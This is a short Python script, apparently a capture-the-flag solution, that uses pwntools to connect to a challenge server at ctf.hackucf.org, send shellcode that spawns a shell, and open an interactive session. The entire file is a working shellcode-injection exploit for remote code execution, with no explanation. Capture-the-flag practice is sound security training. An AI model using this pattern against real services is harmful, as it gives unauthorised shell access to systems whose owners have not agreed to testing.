#!/bin/python3
from pwn import *

p = remote('ctf.hackucf.org', 10103)
p.sendline(asm(shellcraft.sh()))
p.interactive()
